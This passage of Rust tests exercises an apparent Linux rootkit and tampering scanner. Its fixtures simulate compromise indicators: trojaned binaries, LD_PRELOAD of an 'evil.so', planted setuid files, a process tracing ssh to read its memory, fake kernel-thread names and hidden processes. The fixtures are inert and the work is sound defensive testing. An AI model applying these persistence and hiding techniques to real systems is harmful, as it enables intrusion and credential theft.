fn what_no_package_owns_where_programs_are_loaded_from_is_listed() {
    let (dir, mut index) = system(
        "live-installed",
        &[
            ("usr/bin/ls", "ls"),
            ("usr/bin/cat", "cat"),
            ("usr/lib/libc.so.6", "libc"),
            ("usr/lib/libz.so.1", "libz"),
            ("usr/lib/security/pam_unix.so", "pam"),
            ("usr/lib/systemd/systemd", "systemd"),
            ("usr/lib/modules/6.1-test/pkgbase", "linux\n"),
            ("usr/lib/modules/6.1-test/vmlinuz", "kernel"),
            ("usr/lib/modules/6.1-test/kernel/a.ko.zst", "module a"),
        ],
    );
    let root = dir.path();
    index.add_for_test(
        "links",
        "#mtree\n./usr/bin/sh type=link link=bash\n./usr/bin/awk type=link link=gawk\n",
        &[],
    );
    symlink("bash", root.join("usr/bin/sh")).unwrap();
    // A packaged link that leads elsewhere now.
    symlink("/home/u/evil", root.join("usr/bin/awk")).unwrap();
    // Changed where their packages put them.
    write(root, "usr/bin/cat", "trojan");
    write(root, "usr/lib/libz.so.1", "hooked");
    write(root, "usr/lib/modules/6.1-test/vmlinuz", "other kernel");
    // No package's.
    write(root, "usr/bin/stray", "stray");
    write(root, "usr/lib/libstray.so", "stray");
    write(root, "usr/lib/security/pam_stray.so", "stray");
    write(root, "usr/lib/systemd/systemd-stray", "stray");
    write(root, "usr/lib/modules/6.1-test/kernel/stray.ko", "stray");
    // Not a library, and what depmod and DKMS make.
    write(root, "usr/lib/os-release", "NAME=x");
    write(
        root,
        "usr/lib/modules/6.1-test/modules.dep",
        "kernel/a.ko.zst:\n",
    );
    write(
        root,
        "usr/lib/modules/6.1-test/updates/dkms/v.ko.zst",
        "built",
    );
    fs::create_dir_all(root.join("var/lib/dkms")).unwrap();
    write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
    let live = look(root, &index, Origin::System);
    let seen: Vec<(&str, Category, &str)> = live
        .items
        .iter()
        .map(|item| (item.path.as_str(), item.category, item.tier.name()))
        .collect();
    let modules = "usr/lib/modules/6.1-test";
    assert_eq!(
        seen,
        [
            ("usr/bin/awk", Category::Program, "modified"),
            ("usr/bin/cat", Category::Program, "modified"),
            ("usr/bin/stray", Category::Program, "unknown"),
            ("usr/lib/libstray.so", Category::Linker, "unknown"),
            ("usr/lib/libz.so.1", Category::Linker, "modified"),
            (
                &*format!("{modules}/kernel/stray.ko"),
                Category::Kernel,
                "unknown"
            ),
            (&*format!("{modules}/vmlinuz"), Category::Kernel, "modified"),
            ("usr/lib/security/pam_stray.so", Category::Pam, "unknown"),
            (
                "usr/lib/systemd/systemd-stray",
                Category::Systemd,
                "unknown"
            ),
        ]
    );
    // After a kernel update the running kernel's modules are not the
    // installed package's: nothing is said of them.
    fs::remove_file(root.join(modules).join("pkgbase")).unwrap();
    let live = look(root, &index, Origin::System);
    assert!(!live.items.iter().any(|item| item.path.starts_with(modules)));
    // From root these files come as a hash, not with their content.
    let content = |origin: Origin| {
        let live = look(root, &index, origin);
        let stray = live
            .items
            .iter()
            .find(|item| item.path == "usr/bin/stray")
            .unwrap();
        assert!(stray.sha256.is_some());
        stray.body.clone()
    };
    assert_eq!(content(Origin::System), Body::Text("stray".into()));
    assert_eq!(
        content(Origin::Root),
        Body::Binary(crate::sweep::collect::WITHHELD)
    );
}

#[test]
fn a_taint_no_loaded_module_accounts_for_is_a_hidden_module() {
    let (dir, index) = fixture();
    let root = dir.path();
    let hidden = |root: &Path| -> (Vec<RuleId>, Vec<String>) {
        let live = look(root, &index, Origin::System);
        (
            live.items
                .iter()
                .filter(|item| item.path == "sys/module")
                .flat_map(|item| item.alerts.iter().map(|(rule, _)| *rule))
                .collect(),
            live.notes
                .into_iter()
                .filter(|note| note.contains("no loaded module accounts for it"))
                .collect(),
        )
    };
    // Tainted as by an out-of-tree module (4096), and the loaded
    // modules say nothing of the kind.
    write(root, "sys/module/a/taint", "\n");
    write(root, "sys/module/rootkit/taint", "\n");
    assert_eq!(hidden(root), (vec![RuleId::RootkitSign], vec![]));
    // One of them says it did.
    write(root, "sys/module/rootkit/taint", "O\n");
    assert_eq!(hidden(root), (vec![], vec![]));
    // An installed out-of-tree module that is not loaded now may have
    // been: noted.
    write(root, "sys/module/rootkit/taint", "\n");
    write(root, "proc/modules", "a 1 0 - Live 0x0\n");
    let (alerts, notes) = hidden(root);
    assert!(
        alerts.is_empty() && notes.len() == 1,
        "{alerts:?} {notes:?}"
    );
    // Such a module explains only the taints it would have set: not a
    // module loaded by force (2), and a proprietary one (1) only where
    // the module that is not loaded has such a licence.
    for taint in ["4098\n", "4097\n"] {
        write(root, "proc/sys/kernel/tainted", taint);
        let (alerts, notes) = hidden(root);
        assert_eq!(alerts, [RuleId::RootkitSign], "{taint}");
        assert!(notes.is_empty(), "{taint} {notes:?}");
    }
    let modules = "usr/lib/modules/6.1-test";
    write(root, &format!("{modules}/extramodules/nvidia.ko.zst"), "nv");
    write(
        root,
        &format!("{modules}/modules.dep"),
        "kernel/a.ko.zst:\nextramodules/nvidia.ko.zst:\n",
    );
    let (alerts, notes) = hidden(root);
    assert!(
        alerts.is_empty() && notes.len() == 1,
        "{alerts:?} {notes:?}"
    );
    // One that is in the index of modules and not there as a file
    // could not have been loaded: it explains nothing.
    fs::remove_file(root.join(format!("{modules}/extramodules/nvidia.ko.zst"))).unwrap();
    assert_eq!(hidden(root).0, [RuleId::RootkitSign]);
}

#[test]
fn every_process_number_is_tried_and_what_was_not_is_said() {
    use super::Status;
    // A hidden process far above the listed ones is found.
    let listed: HashSet<u32> = [1, 2, 700].into_iter().collect();
    let answers = |pid: u32| {
        (pid == 300_123).then(|| Status {
            name: "hidden".into(),
            group: pid,
            ..Status::default()
        })
    };
    assert_eq!(
        super::kernel::unlisted_among(&listed, 1..=400_000, &answers),
        (vec![(300_123, "hidden".to_string())], vec![])
    );
    // A searcher that dies takes its share of the numbers with it:
    // that share is named, not passed over as searched.
    let dying = |pid: u32| {
        assert!(pid != 300_500, "a searcher dies");
        None
    };
    let (suspects, not_searched) = super::kernel::unlisted_among(&listed, 1..=400_000, &dying);
    assert!(suspects.is_empty());
    assert_eq!(not_searched.len(), 1);
    assert!(not_searched[0].contains(&300_500));
    // The numbers go up to the most a kernel hands out, whatever its
    // limit says: root can lower that after starting a process above it.
    let dir = TempDir::new("live-numbers");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = |origin| Scope {
        root,
        home: None,
        index: &index,
        origin,
    };
    process(root, "7", "/usr/bin/x", &[], "");
    write(root, "proc/sys/kernel/pid_max", "5000\n");
    // Past what is tried, a user's sweep notes it and root's counts it as
    // not checked.
    let running = super::processes(root);
    let search = |origin, most| {
        let mut found = super::Found::default();
        super::kernel::hidden_processes(&scope(origin), &running, most, &mut found);
        (found.notes, found.unchecked)
    };
    let (notes, unchecked) = search(Origin::System, 100);
    assert!(unchecked.is_empty());
    assert_eq!(
        notes,
        [
            "process numbers go up to 65535: only the newest 100 were tried in the search for hidden processes"
        ]
    );
    let (notes, unchecked) = search(Origin::Root, 100);
    assert!(notes.is_empty() && unchecked.len() == 1, "{unchecked:?}");
    let said = |origin| {
        let mut found = super::Found::default();
        super::kernel::say_not_searched(&scope(origin), &not_searched, &mut found);
        (found.notes, found.unchecked)
    };
    let (notes, unchecked) = said(Origin::Root);
    assert!(notes.is_empty() && unchecked.len() == 1);
    assert!(unchecked[0].ends_with("that part of the search failed"));
    let (notes, unchecked) = said(Origin::System);
    assert!(unchecked.is_empty() && notes.len() == 1);
}

#[test]
fn a_list_of_processes_that_shows_none_is_one_finding() {
    let dir = TempDir::new("live-unlisted");
    let root = dir.path();
    host_mounts(root);
    let index = PackageIndex::with_foreign(HashSet::new());
    for pid in ["7", "8", "9"] {
        process(root, pid, "/usr/bin/x", &[], "");
        detail(
            root,
            pid,
            "status",
            &format!("Name:\tx\nTgid:\t{pid}\nPid:\t{pid}\n"),
        );
    }
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    // A list that shows none, while each process still answers; the list
    // read again shows them all, and is not believed.
    let mut found = super::Found::default();
    super::kernel::hidden_processes(&scope, &super::Running::default(), 65_536, &mut found);
    let hidden: Vec<_> = found.items.values().collect();
    assert_eq!(hidden.len(), 1, "{hidden:?}");
    assert_eq!(found.items.keys().next().unwrap(), "proc#unlisted");
    assert!(
        hidden[0].notes[0].contains("3 processes answer"),
        "{:?}",
        hidden[0].notes
    );
}

#[test]
fn a_process_shown_only_to_a_later_list_is_hidden_unless_it_started_after_the_first() {
    let dir = TempDir::new("live-relisted");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    // The first list is read at tick 1000 and the second at 2000, and shows
    // them all: 8 started before the first, 9 and 10 between, 11 after the
    // second (made up), and 12's start cannot be read.
    for (pid, started) in [
        ("7", 10),
        ("8", 500),
        ("9", 1000),
        ("10", 1500),
        ("11", 2500),
        ("12", 0),
    ] {
        process(root, pid, "/usr/bin/x", &[], "");
        detail(
            root,
            pid,
            "status",
            &format!("Name:\tx\nTgid:\t{pid}\nPid:\t{pid}\n"),
        );
        let fields = vec!["0"; 18].join(" ");
        let stat = if pid == "12" {
            format!("{pid} (x)\n")
        } else {
            format!("{pid} (a ) b) S {fields} {started} 0\n")
        };
        detail(root, pid, "stat", &stat);
    }
    write(root, "proc/uptime", "20.00 5.00\n");
    let hidden = |listed_at| {
        let running = super::Running {
            listed: vec![super::Listed {
                pid: 7,
                status: super::Status::default(),
                started_as: None,
                kernel_thread: false,
            }],
            listed_at,
            ..super::Running::default()
        };
        let mut found = super::Found::default();
        super::kernel::hidden_processes(&scope, &running, 65_536, &mut found);
        found.items.into_keys().collect::<Vec<_>>()
    };
    assert_eq!(hidden(Some(1000)), ["proc/11", "proc/12", "proc/8"]);
    // Where the time of the first list is not known, none is new.
    assert_eq!(hidden(None).len(), 5);
    assert_eq!(super::processes(root).listed_at, Some(2000));
    // A name that is not UTF-8 answers all the same.
    fs::write(
        root.join("proc/8/status"),
        b"Name:\t\xff\xfe\nTgid:\t8\nPid:\t8\n",
    )
    .unwrap();
    assert!(hidden(Some(1000)).contains(&"proc/8".to_string()));
}

#[test]
fn root_says_when_it_cannot_list_the_pinned_ebpf_objects() {
    let dir = TempDir::new("live-bpf");
    let root = dir.path();
    host_mounts(root);
    let index = PackageIndex::with_foreign(HashSet::new());
    // No such filesystem: nothing to say.
    assert!(look(root, &index, Origin::Root).unchecked.is_empty());
    fs::create_dir_all(root.join("sys/fs/bpf")).unwrap();
    fs::set_permissions(root.join("sys/fs/bpf"), fs::Permissions::from_mode(0o000)).unwrap();
    let closed = fs::read_dir(root.join("sys/fs/bpf")).is_err();
    let as_root = look(root, &index, Origin::Root);
    let as_user = look(root, &index, Origin::System);
    fs::set_permissions(root.join("sys/fs/bpf"), fs::Permissions::from_mode(0o755)).unwrap();
    // Run as root, nothing is closed to the test.
    if !closed {
        return;
    }
    assert_eq!(as_root.unchecked.len(), 1, "{:?}", as_root.unchecked);
    assert!(as_root.unchecked[0].starts_with("/sys/fs/bpf: could not be listed"));
    assert!(as_user.unchecked.is_empty());
}

#[test]
fn a_process_missing_from_the_list_is_found_by_its_number() {
    use super::Status;
    let listed: HashSet<u32> = [1, 2, 5].into_iter().collect();
    let answers = |pid: u32| match pid {
        // A process of its own, a thread of process 2, and one named
        // outside the range.
        3 | 9 => Some(Status {
            name: format!("hidden{pid}"),
            group: pid,
            ..Status::default()
        }),
        4 => Some(Status {
            name: "thread".into(),
            group: 2,
            ..Status::default()
        }),
        _ => None,
    };
    assert_eq!(
        super::kernel::unlisted(&listed, [0, 9, 5].into_iter().chain(1..8), &answers),
        [(9, "hidden9".to_string()), (3, "hidden3".to_string())]
    );
    let status = super::parse_status(
        "Name:\tkworker/0:1\nTgid:\t7\nPid:\t9\nPPid:\t2\nTracerPid:\t0\nUid:\t0\t0\t0\t0\n",
    );
    assert_eq!(
        status,
        Status {
            name: "kworker/0:1".into(),
            group: 7,
            parent: 2,
            tracer: 0,
            of_root: true
        }
    );
}

#[test]
fn a_program_named_like_a_kernel_thread_and_an_attached_process_are_said() {
    let (dir, index) = system(
        "live-attached",
        &[("usr/bin/ssh", "ssh"), ("usr/bin/gdb", "gdb")],
    );
    let root = dir.path();
    for path in ["home/u/.local/k", "home/u/spy", "home/u/app"] {
        write(root, path, path);
    }
    let status = |pid: &str, name: &str, parent: u32, tracer: u32| {
        detail(
            root,
            pid,
            "status",
            &format!(
                "Name:\t{name}\nTgid:\t{pid}\nPid:\t{pid}\nPPid:\t{parent}\nTracerPid:\t{tracer}\n"
            ),
        );
    };
    // A kernel thread: no program, no command line.
    status("2", "kthreadd", 0, 0);
    status("3", "kworker/0:1", 2, 0);
    // A program that calls itself one, either way.
    process(root, "60", "/home/u/.local/k", &[], "");
    detail(root, "60", "cmdline", "[kworker/0:2]\0");
    status("60", "k", 1, 0);
    process(root, "61", "/home/u/.local/k", &[], "");
    detail(root, "61", "cmdline", "k\0");
    status("61", "[kthreadd]", 1, 0);
    // Something attached to a program that holds secrets.
    process(root, "70", "/usr/bin/ssh", &[], "");
    status("70", "ssh", 1, 71);
    process(root, "71", "/home/u/spy", &[], "");
    status("71", "spy", 1, 0);
    // A packaged debugger at work, a program started under what
    // traces it, and something attached to a program it did not
    // start.
    process(root, "72", "/home/u/app", &[], "");
    status("72", "app", 1, 73);
    process(root, "73", "/usr/bin/gdb", &[], "");
    status("73", "gdb", 1, 0);
    process(root, "74", "/home/u/app", &[], "");
    status("74", "app", 75, 75);
    process(root, "75", "/home/u/spy", &[], "");
    status("75", "spy", 1, 0);
    process(root, "76", "/home/u/app", &[], "");
    status("76", "app", 1, 75);
    // eBPF pins: systemd's own, and one nothing explains.
    write(root, "sys/fs/bpf/systemd/x", "");
    write(root, "sys/fs/bpf/hook", "");
    let live = look(root, &index, Origin::System);
    assert_eq!(
        listed(&live),
        [
            ("home/u/.local/k", vec![RuleId::RootkitSign]),
            ("home/u/spy:attached-to-app", vec![RuleId::TracedProcess]),
            ("home/u/spy:attached-to-ssh", vec![RuleId::TracedSecrets]),
            ("sys/fs/bpf/hook", vec![RuleId::KernelTap]),
        ]
    );
    // None of these processes is root's, and each item's name holds what
    // the account chose; what is pinned in the kernel is root's.
    assert!(live.of_accounts.contains("home/u/spy:attached-to-app"));
    assert!(!live.of_accounts.contains("sys/fs/bpf/hook"));
    let spy = live
        .items
        .iter()
        .find(|item| item.path == "home/u/spy:attached-to-ssh")
        .unwrap();
    assert_eq!(
        spy.notes,
        ["process 71 is attached to process 70 (ssh) and can read its memory"]
    );
}

#[test]
fn processes_root_cannot_read_are_a_finding_for_root_only() {
    let dir = TempDir::new("live-unreadable");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    process(root, "90", "/usr/bin/x", &[], "");
    let closed = root.join("proc/90");
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o000)).unwrap();
    // Run as root, nothing is closed to the test.
    let readable = fs::read_link(closed.join("exe")).is_ok();
    let as_user = look(root, &index, Origin::System);
    let as_root = look(root, &index, Origin::Root);
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o755)).unwrap();
    if readable {
        return;
    }
    assert!(as_user.items.is_empty(), "{:?}", as_user.items);
    assert!(
        as_user
            .notes
            .iter()
            .any(|note| note.contains("the root checks cover them"))
    );
    assert_eq!(listed(&as_root), [("proc", vec![RuleId::RootkitSign])]);
}

#[test]
fn what_an_interpreter_was_told_is_part_of_its_listeners_name() {
    let told = |arguments: &[&str]| {
        super::told(
            &running("/usr/bin/python3", arguments, None, ""),
            "usr/bin/python3",
        )
    };
    assert_eq!(
        told(&["python3", "-m", "http.server"]).as_deref(),
        Some("http.server")
    );
    assert_eq!(told(&["python3"]), None);
    // Code is named by its hash: another line of code is another item.
    let one = told(&["python3", "-c", "import socket; s = socket.socket()"]).unwrap();
    let other = told(&["python3", "-c", "import socket; t = socket.socket()"]).unwrap();
    assert!(
        one.starts_with("code-") && one.len() == 17 && one != other,
        "{one} {other}"
    );
    // A name holds nothing that reads as a path.
    assert_eq!(told(&["python3", "../x y"]).unwrap().len(), 17);
    assert_eq!(super::plain("a/b:c"), "a_b_c");
    assert_eq!(super::plain(".."), "_");
    // A program that is no interpreter was told nothing.
    assert_eq!(
        super::told(
            &running("/usr/bin/nginx", &["nginx", "x"], None, ""),
            "usr/bin/nginx"
        ),
        None
    );
}

/// What a sweep said it could not read, as a user's sweep notes it
/// and as the root checks leave it unchecked.
fn unread(root: &Path, index: &PackageIndex) -> (Vec<String>, Vec<String>) {
    let said = |sentences: Vec<String>| {
        let mut said: Vec<String> = sentences
            .into_iter()
            .filter(|sentence| sentence.contains("could not be"))
            .collect();
        said.sort();
        said
    };
    let as_user = look(root, index, Origin::System);
    let as_root = look(root, index, Origin::Root);
    // Never both ways at once.
    assert_eq!(said(as_user.unchecked), [""; 0]);
    assert_eq!(said(as_root.notes), [""; 0]);
    (said(as_user.notes), said(as_root.unchecked))
}

#[test]
fn a_kernel_source_that_is_there_and_cannot_be_read_is_said() {
    let pkgbase = "usr/lib/modules/6.1-test/pkgbase";
    let (dir, index) = system("live-unread", &[(pkgbase, "linux\n")]);
    let root = dir.path();
    write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
    write(root, "usr/lib/modules/6.1-test/modules.dep", "");
    process(root, "7", "/usr/bin/x", &[], "");
    // What is not there is a kernel without it: nothing to say.
    assert_eq!(unread(root, &index), (vec![], vec![]));
    // A directory where a file belongs and a file where a directory
    // does are there, and are not read by root either.
    for file in ["proc/modules", "proc/net/tcp", "proc/net/packet"] {
        fs::create_dir_all(root.join(file)).unwrap();
    }
    write(root, "sys/module", "no directory");
    let (notes, unchecked) = unread(root, &index);
    assert_eq!(notes, unchecked);
    assert_eq!(unchecked.len(), 4, "{unchecked:?}");
    for (said, (start, end)) in unchecked.iter().zip([
        (
            "/proc/modules: could not be read (",
            "); loaded kernel modules were not checked",
        ),
        (
            "/proc/net/packet: could not be read (",
            "); raw packet sockets were not checked",
        ),
        (
            "/proc/net/tcp: could not be read (",
            "); the sockets it lists were not checked",
        ),
        (
            "/sys/module: could not be read (",
            "); a module the kernel's list does not show was not looked for",
        ),
    ]) {
        assert!(said.starts_with(start) && said.ends_with(end), "{said}");
    }
}

#[test]
fn a_kernel_release_or_a_list_of_processes_that_cannot_be_read_is_said() {
    let (dir, index) = system("live-unread-release", &[]);
    let root = dir.path();
    // A release that names no directory.
    write(root, "proc/sys/kernel/osrelease", "../x\n");
    host_mounts(root);
    let nameless = "/proc/sys/kernel/osrelease: names no kernel release; loaded kernel modules were not checked";
    assert_eq!(
        look(root, &index, Origin::System).notes,
        [nameless.to_string()]
    );
    assert_eq!(
        look(root, &index, Origin::Root).unchecked,
        [nameless.to_string()]
    );
    // One that cannot be read.
    fs::remove_file(root.join("proc/sys/kernel/osrelease")).unwrap();
    fs::create_dir_all(root.join("proc/sys/kernel/osrelease")).unwrap();
    let (notes, unchecked) = unread(root, &index);
    assert_eq!(notes, unchecked);
    assert_eq!(unchecked.len(), 1, "{unchecked:?}");
    assert!(
        unchecked[0].starts_with("/proc/sys/kernel/osrelease: could not be read (")
            && unchecked[0].ends_with("); loaded kernel modules were not checked"),
        "{unchecked:?}"
    );
    // The tables of another network namespace, read through a process
    // in it; not those of a process that is gone by then.
    fs::remove_dir_all(root.join("proc/sys")).unwrap();
    process(root, "7", "/usr/bin/x", &[], "");
    fs::create_dir_all(root.join("proc/self/ns")).unwrap();
    symlink("net:[1]", root.join("proc/self/ns/net")).unwrap();
    fs::create_dir_all(root.join("proc/7/ns")).unwrap();
    symlink("net:[2]", root.join("proc/7/ns/net")).unwrap();
    assert_eq!(unread(root, &index), (vec![], vec![]));
    fs::create_dir_all(root.join("proc/7/net/udp")).unwrap();
    let elsewhere = "the sockets of 1 other network namespace(s) could not be read; connections there were not checked";
    assert_eq!(
        unread(root, &index),
        (vec![elsewhere.to_string()], vec![elsewhere.to_string()])
    );
    // No list of processes at all, where there is a `/proc`.
    let dir = TempDir::new("live-unread-proc");
    let root = dir.path();
    assert!(super::processes(root).unlistable.is_none());
    write(root, "proc", "no directory");
    assert!(super::processes(root).unlistable.is_some());
    let (notes, mut unchecked) = unread(root, &index);
    // Only root's search for set-id files reads the mounts.
    let mounts = unchecked
        .iter()
        .position(|said| said.starts_with("/proc/1/mountinfo could not be read"))
        .expect("root says the mounts could not be read");
    unchecked.remove(mounts);
    assert_eq!(notes, unchecked);
    assert!(
        unchecked.iter().any(|said| {
            said.starts_with("/proc: could not be listed (")
                && said.ends_with("); running processes were not checked")
        }),
        "{unchecked:?}"
    );
}

#[test]
fn directories_the_search_for_setuid_programs_cannot_list_are_said_once() {
    use super::Closed;
    let dir = TempDir::new("live-closed");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = |origin| Scope {
        root,
        home: None,
        index: &index,
        origin,
    };
    // One sentence however many there are: a note that leaves them to
    // the root checks for a user, not checked for root.
    let say = |origin, directories: &[&str]| {
        let mut closed = Closed::default();
        for directory in directories {
            closed.add(directory);
        }
        let mut found = super::Found::default();
        closed.say(&scope(origin), &mut found);
        (found.notes, found.unchecked)
    };
    assert_eq!(say(Origin::Root, &[]), (vec![], vec![]));
    assert_eq!(say(Origin::System, &[]), (vec![], vec![]));
    assert_eq!(
            say(Origin::Root, &["var/lib/x", "root", "var/a"]),
            (
                vec![],
                vec![
                    "setuid programs were not looked for in 3 place(s) that could not be listed (/root among them)"
                        .to_string()
                ]
            )
        );
    assert_eq!(
            say(Origin::System, &["var/lib/x", "root"]),
            (
                vec![
                    "setuid programs were not looked for in 2 place(s) that could not be listed; the root checks cover them"
                        .to_string()
                ],
                vec![]
            )
        );
    // The walk itself: what it can list, and what is no directory,
    // is nothing to say.
    write(root, "usr/local/bin/x", "x");
    write(root, "etc", "no directory");
    host_mounts(root);
    fs::create_dir_all(root.join("var/closed/below")).unwrap();
    let walk = |origin| {
        let mut found = super::Found::default();
        super::privileged_files(&scope(origin), &mut found);
        (found.notes, found.unchecked)
    };
    assert_eq!(walk(Origin::System), (vec![], vec![]));
    assert_eq!(walk(Origin::Root), (vec![], vec![]));
    // A directory closed to the reader. Nothing is closed to root, who
    // walks into it like any other.
    let closed = root.join("var/closed");
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o000)).unwrap();
    let is_closed = fs::read_dir(&closed).is_err();
    let (as_user, as_root) = (walk(Origin::System), walk(Origin::Root));
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o755)).unwrap();
    if is_closed {
        assert_eq!(as_user, say(Origin::System, &["var/closed"]));
        assert_eq!(as_root, say(Origin::Root, &["var/closed"]));
    } else {
        assert_eq!((as_user, as_root), ((vec![], vec![]), (vec![], vec![])));
    }
}

#[test]
fn a_place_closed_on_a_mount_without_set_id_is_told_apart() {
    use super::privileged::Mount;
    use super::{Closed, mounts};

    let mountinfo = "\
36 1 8:2 / / rw,relatime shared:1 - ext4 /dev/sda2 rw
37 36 8:3 / /home rw,nosuid,relatime shared:2 - ext4 /dev/sda3 rw
90 37 0:50 / /home/u/remote rw,nosuid,nodev,relatime shared:60 - fuse.sshfs host: rw,user_id=1000,group_id=1000
91 37 0:51 / /home/u/my\\040drive rw,nosuid,nodev - fuse.rclone r: rw
92 37 8:17 / /home/u/disk rw,nodev - ext4 /dev/sdb1 rw
93 36 0:52 / /var/x rw,nosuid - tmpfs tmpfs rw
94 93 8:18 / /var/x rw - ext4 /dev/sdc1 rw
";
    let read = mounts(mountinfo);
    assert_eq!(read.len(), 7);
    let mount = |place: &str, nosuid| Mount {
        place: place.to_string(),
        nosuid,
    };
    assert!(read.contains(&mount("home/u/my drive", true)));
    assert!(read.contains(&mount("", false)));
    assert!(read.contains(&mount("home/u/remote", true)));
    let mut closed = Closed {
        mounts: Some(read),
        ..Closed::default()
    };
    // On a mount without set-id, and below one.
    for covered in [
        "home/u/remote",
        "home/u/remote/below",
        "home/u/my drive",
        "home/x",
    ] {
        assert!(closed.without_set_id(covered), "{covered}");
        closed.add(covered);
    }
    assert_eq!((closed.covered, closed.count), (4, 0));
    assert_eq!(closed.covered_first.as_deref(), Some("home/u/my drive"));
    // A mount with set-id below one without, one mounted over one
    // without, and a name that only begins like a mount.
    for counted in ["home/u/disk/closed", "var/x/closed", "var/x2", "root"] {
        assert!(!closed.without_set_id(counted), "{counted}");
        closed.add(counted);
    }
    assert_eq!((closed.covered, closed.count), (4, 4));
    assert_eq!(closed.first.as_deref(), Some("home/u/disk/closed"));
    // With no mounts read (a user's search), nothing is told apart.
    assert!(!Closed::default().without_set_id("home/u/remote"));
    assert!(mounts("1 2 3\n").is_empty());
}

#[test]
fn what_only_an_accounts_processes_or_files_led_to_is_the_accounts() {
    let (dir, index) = system("live-chooser", &[("usr/bin/tool", "packaged")]);
    let root = dir.path();
    // Changed since its package installed it: root's own comparison finds
    // it, though only an account's process runs it.
    write(root, "usr/bin/tool", "changed");
    let roots = "Name:\tx\nUid:\t0\t0\t0\t0\n";
    for (pid, exe, of_root) in [
        ("1", "/tmp/roots", true),
        ("2", "/tmp/accounts", false),
        ("3", "/tmp/shared", false),
        ("4", "/tmp/shared", true),
        ("5", "/usr/bin/tool", false),
        ("6", "/opt/kworker", false),
        ("7", "/usr/bin/unowned", false),
    ] {
        // A device the test cannot tell is no keyboard counts as one: what
        // reads it is said of the same item as what changed.
        let fds: &[(&str, &str)] = if pid == "5" || pid == "7" {
            &[("3", "/dev/input/event0")]
        } else {
            &[]
        };
        process(root, pid, exe, fds, "");
        if of_root {
            detail(root, pid, "status", roots);
        }
    }
    // Not on disk: the name is the account's.
    detail(root, "6", "cmdline", "[kworker/0:1]");
    // No package's, in a directory root's own look goes through.
    write(root, "usr/bin/unowned", "x");
    // Root here is whoever made the test tree. What an account's process
    // runs from a directory anyone can write is the account's.
    write(root, "tmp/accounts", "x");
    fs::set_permissions(root.join("tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    // Libraries of root's in a directory only root writes, which an
    // account's process preloads: by their own path, through a link of the
    // account's and through one of the system's. Any account can name every
    // file root has, under as many names as there are links to it.
    write(root, "usr/local/lib/evil.so", "x");
    symlink("../usr/local/lib", root.join("tmp/a0")).unwrap();
    symlink("usr/local/lib", root.join("lib64")).unwrap();
    process(
        root,
        "8",
        "/opt/other",
        &[],
        "LD_PRELOAD=/usr/local/lib/evil.so:/tmp/a0/evil.so:/lib64/evil.so;",
    );
    // Set-id files: one in a directory anyone can write, one of root's in
    // a directory only root writes.
    for (path, directory_mode) in [("home/u/f", 0o1777), ("usr/local/bin/planted", 0o755)] {
        write(root, path, "x");
        fs::set_permissions(root.join(path), fs::Permissions::from_mode(0o4755)).unwrap();
        let directory = root.join(path).parent().unwrap().to_path_buf();
        fs::set_permissions(directory, fs::Permissions::from_mode(directory_mode)).unwrap();
    }
    host_mounts(root);
    let live = look(root, &index, Origin::Root);
    let found: HashSet<&str> = live.items.iter().map(|item| item.path.as_str()).collect();
    for path in [
        "tmp/roots",
        "tmp/accounts",
        "tmp/shared",
        "usr/bin/tool",
        "home/u/f",
        "opt/kworker",
        "usr/bin/unowned",
        "usr/local/lib/evil.so",
        "tmp/a0/evil.so",
        "lib64/evil.so",
        "usr/local/bin/planted",
    ] {
        assert!(found.contains(path), "{path} in {found:?}");
    }
    let mut of_accounts: Vec<&str> = live.of_accounts.iter().map(String::as_str).collect();
    of_accounts.sort_unstable();
    assert_eq!(
        of_accounts,
        [
            "home/u/f",
            "lib64/evil.so",
            "opt/kworker",
            "tmp/a0/evil.so",
            "tmp/accounts",
            "usr/local/lib/evil.so",
        ]
    );
    // What root's process runs is root's, wherever it is.
    assert!(live.of_root.contains("tmp/roots"), "{:?}", live.of_root);
    assert!(live.of_root.is_disjoint(&live.of_accounts));
}

#[test]
fn a_set_id_file_is_roots_alone_only_where_only_root_names_files() {
    let dir = TempDir::new("live-roots-alone");
    let root = dir.path();
    setuid_file(&root.join("usr/lib/real"));
    // Root's own directory, in one an account may write: the account may
    // rename it and put its own in its place.
    setuid_file(&root.join("var/tmp/d/real"));
    fs::set_permissions(root.join("var/tmp"), fs::Permissions::from_mode(0o1777)).unwrap();
    // A link is not followed: one file of root's has no second name.
    symlink("usr/lib", root.join("lib64")).unwrap();
    symlink("../../usr/lib", root.join("var/tmp/a")).unwrap();
    let found = walk_as_root(root, files(1_000), none_anywhere, ONE_MOUNT);
    assert!(
        found.of_root.contains("usr/lib/real"),
        "{:?}",
        found.of_root
    );
    assert!(
        found.of_accounts.contains("var/tmp/d/real"),
        "{:?}",
        found.of_accounts
    );
    assert_eq!(found.items.len(), 2, "{:?}", found.items.keys());
    // Not known to be on a mount where set-id bits take effect.
    let found = walk_as_root(root, files(1_000), none_anywhere, "");
    assert!(
        found.of_accounts.contains("usr/lib/real"),
        "{:?}",
        found.of_accounts
    );
    // Itself on a mount without set-id: a file can be a mount point.
    let mountinfo = format!("{ONE_MOUNT}40 22 0:40 / /usr/lib/real rw,nosuid - ext4 x rw\n");
    let found = walk_as_root(root, files(1_000), none_anywhere, &mountinfo);
    assert!(
        found.of_accounts.contains("usr/lib/real"),
        "{:?}",
        found.of_accounts
    );
    // In a directory others can write.
    fs::set_permissions(root.join("usr/lib"), fs::Permissions::from_mode(0o777)).unwrap();
    let found = walk_as_root(root, files(1_000), none_anywhere, ONE_MOUNT);
    assert!(
        found.of_accounts.contains("usr/lib/real"),
        "{:?}",
        found.of_accounts
    );
}

#[test]
fn a_set_id_file_on_a_mount_without_set_id_is_an_accounts() {
    let dir = TempDir::new("live-nosuid-mount");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
